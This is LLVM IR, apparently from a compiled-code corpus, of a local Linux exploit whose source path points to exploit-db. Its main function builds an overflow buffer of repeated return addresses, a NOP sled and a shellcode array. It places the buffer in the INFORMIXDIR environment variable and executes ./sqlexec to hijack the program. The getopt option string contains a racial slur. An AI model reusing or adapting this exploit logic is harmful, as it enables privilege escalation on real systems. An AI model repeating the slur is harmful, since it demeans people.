; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21496.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21496.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32, i32 }

@.str = private unnamed_addr constant [13 x i8] c"t:r:o:nigger\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i32 0, align 4
@type = common dso_local global i64 0, align 8
@targets = common dso_local global %struct.TYPE_2__* null, align 8
@.str.1 = private unnamed_addr constant [28 x i8] c"[<>] - Stack pointer: 0x%x\0A\00", align 1
@.str.2 = private unnamed_addr constant [21 x i8] c"[<>] - Offset: 0x%x\0A\00", align 1
@.str.3 = private unnamed_addr constant [26 x i8] c"[<>] - Return addr: 0x%x\0A\00", align 1
@BUFFERSIZE = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [27 x i8] c"Couldn't allocate memory.\0A\00", align 1
@lunixshell = common dso_local global i32* null, align 8
@.str.5 = private unnamed_addr constant [12 x i8] c"INFORMIXDIR\00", align 1
@.str.6 = private unnamed_addr constant [10 x i8] c"./sqlexec\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"sqlexec\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = load i32, i32* %4, align 4
  %14 = icmp slt i32 %13, 3
  br i1 %14, label %15, label %20

15:                                               ; preds = %2
  %16 = load i8**, i8*** %5, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 0
  %18 = load i8*, i8** %17, align 8
  %19 = call i32 @usage(i8* %18)
  store i32 1, i32* %3, align 4
  br label %161

20:                                               ; preds = %2
  br label %21

21:                                               ; preds = %53, %20
  %22 = load i32, i32* %4, align 4
  %23 = load i8**, i8*** %5, align 8
  %24 = call i32 @getopt(i32 %22, i8** %23, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i64 0, i64 0))
  store i32 %24, i32* %7, align 4
  %25 = load i32, i32* @EOF, align 4
  %26 = icmp ne i32 %24, %25
  br i1 %26, label %27, label %54

27:                                               ; preds = %21
  %28 = load i32, i32* %7, align 4
  switch i32 %28, label %48 [
    i32 116, label %29
    i32 114, label %33
    i32 111, label %40
  ]

29:                                               ; preds = %27
  %30 = load i32, i32* @optarg, align 4
  %31 = call i8* @atoi(i32 %30)
  %32 = ptrtoint i8* %31 to i64
  store i64 %32, i64* @type, align 8
  br label %53

33:                                               ; preds = %27
  %34 = load i32, i32* @optarg, align 4
  %35 = call i32 @strtoul(i32 %34, i32* null, i32 16)
  %36 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %37 = load i64, i64* @type, align 8
  %38 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %36, i64 %37
  %39 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %38, i32 0, i32 0
  store i32 %35, i32* %39, align 4
  br label %53

40:                                               ; preds = %27
  %41 = load i32, i32* @optarg, align 4
  %42 = call i8* @atoi(i32 %41)
  %43 = ptrtoint i8* %42 to i32
  %44 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %45 = load i64, i64* @type, align 8
  %46 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %44, i64 %45
  %47 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %46, i32 0, i32 1
  store i32 %43, i32* %47, align 4
  br label %53

48:                                               ; preds = %27
  %49 = load i8**, i8*** %5, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 0
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 @usage(i8* %51)
  store i32 1, i32* %3, align 4
  br label %161

53:                                               ; preds = %40, %33, %29
  br label %21

54:                                               ; preds = %21
  %55 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %56 = load i64, i64* @type, align 8
  %57 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %55, i64 %56
  %58 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %57, i32 0, i32 0
  %59 = load i32, i32* %58, align 4
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.1, i64 0, i64 0), i32 %59)
  %61 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %62 = load i64, i64* @type, align 8
  %63 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %61, i64 %62
  %64 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %63, i32 0, i32 1
  %65 = load i32, i32* %64, align 4
  %66 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0), i32 %65)
  %67 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %68 = load i64, i64* @type, align 8
  %69 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %67, i64 %68
  %70 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %69, i32 0, i32 0
  %71 = load i32, i32* %70, align 4
  %72 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %73 = load i64, i64* @type, align 8
  %74 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %72, i64 %73
  %75 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %74, i32 0, i32 1
  %76 = load i32, i32* %75, align 4
  %77 = sub nsw i32 %71, %76
  %78 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.3, i64 0, i64 0), i32 %77)
  %79 = load i32, i32* @BUFFERSIZE, align 4
  %80 = call i8* @malloc(i32 %79)
  store i8* %80, i8** %10, align 8
  %81 = icmp ne i8* %80, null
  br i1 %81, label %85, label %82

82:                                               ; preds = %54
  %83 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.4, i64 0, i64 0))
  %84 = call i32 @exit(i32 -1) #3
  unreachable

85:                                               ; preds = %54
  %86 = load i8*, i8** %10, align 8
  store i8* %86, i8** %11, align 8
  %87 = load i8*, i8** %11, align 8
  %88 = bitcast i8* %87 to i64*
  store i64* %88, i64** %9, align 8
  store i32 0, i32* %6, align 4
  br label %89

89:                                               ; preds = %108, %85
  %90 = load i32, i32* %6, align 4
  %91 = load i32, i32* @BUFFERSIZE, align 4
  %92 = icmp slt i32 %90, %91
  br i1 %92, label %93, label %111

93:                                               ; preds = %89
  %94 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %95 = load i64, i64* @type, align 8
  %96 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %94, i64 %95
  %97 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %96, i32 0, i32 0
  %98 = load i32, i32* %97, align 4
  %99 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %100 = load i64, i64* @type, align 8
  %101 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %99, i64 %100
  %102 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %101, i32 0, i32 1
  %103 = load i32, i32* %102, align 4
  %104 = sub nsw i32 %98, %103
  %105 = sext i32 %104 to i64
  %106 = load i64*, i64** %9, align 8
  %107 = getelementptr inbounds i64, i64* %106, i32 1
  store i64* %107, i64** %9, align 8
  store i64 %105, i64* %106, align 8
  br label %108

108:                                              ; preds = %93
  %109 = load i32, i32* %6, align 4
  %110 = add nsw i32 %109, 4
  store i32 %110, i32* %6, align 4
  br label %89

111:                                              ; preds = %89
  store i32 0, i32* %6, align 4
  br label %112

112:                                              ; preds = %122, %111
  %113 = load i32, i32* %6, align 4
  %114 = load i32, i32* @BUFFERSIZE, align 4
  %115 = sdiv i32 %114, 2
  %116 = icmp slt i32 %113, %115
  br i1 %116, label %117, label %125

117:                                              ; preds = %112
  %118 = load i8*, i8** %10, align 8
  %119 = load i32, i32* %6, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8, i8* %118, i64 %120
  store i8 -112, i8* %121, align 1
  br label %122

122:                                              ; preds = %117
  %123 = load i32, i32* %6, align 4
  %124 = add nsw i32 %123, 1
  store i32 %124, i32* %6, align 4
  br label %112

125:                                              ; preds = %112
  %126 = load i8*, i8** %10, align 8
  %127 = load i32, i32* @BUFFERSIZE, align 4
  %128 = sdiv i32 %127, 2
  %129 = load i32*, i32** @lunixshell, align 8
  %130 = call i32 @strlen(i32* %129)
  %131 = sdiv i32 %130, 2
  %132 = sub nsw i32 %128, %131
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds i8, i8* %126, i64 %133
  store i8* %134, i8** %11, align 8
  store i32 0, i32* %6, align 4
  br label %135

135:                                              ; preds = %149, %125
  %136 = load i32, i32* %6, align 4
  %137 = load i32*, i32** @lunixshell, align 8
  %138 = call i32 @strlen(i32* %137)
  %139 = icmp slt i32 %136, %138
  br i1 %139, label %140, label %152

140:                                              ; preds = %135
  %141 = load i32*, i32** @lunixshell, align 8
  %142 = load i32, i32* %6, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds i32, i32* %141, i64 %143
  %145 = load i32, i32* %144, align 4
  %146 = trunc i32 %145 to i8
  %147 = load i8*, i8** %11, align 8
  %148 = getelementptr inbounds i8, i8* %147, i32 1
  store i8* %148, i8** %11, align 8
  store i8 %146, i8* %147, align 1
  br label %149

149:                                              ; preds = %140
  %150 = load i32, i32* %6, align 4
  %151 = add nsw i32 %150, 1
  store i32 %151, i32* %6, align 4
  br label %135

152:                                              ; preds = %135
  %153 = load i8*, i8** %10, align 8
  %154 = load i32, i32* @BUFFERSIZE, align 4
  %155 = sub nsw i32 %154, 1
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds i8, i8* %153, i64 %156
  store i8 0, i8* %157, align 1
  %158 = load i8*, i8** %10, align 8
  %159 = call i32 @setenv(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.5, i64 0, i64 0), i8* %158, i32 1)
  %160 = call i32 @execl(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0), i32* null)
  store i32 0, i32* %3, align 4
  br label %161

161:                                              ; preds = %152, %48, %15
  %162 = load i32, i32* %3, align 4
  ret i32 %162
}

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i8* @atoi(i32) #1

declare dso_local i32 @strtoul(i32, i32*, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @malloc(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @setenv(i8*, i8*, i32) #1

declare dso_local i32 @execl(i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
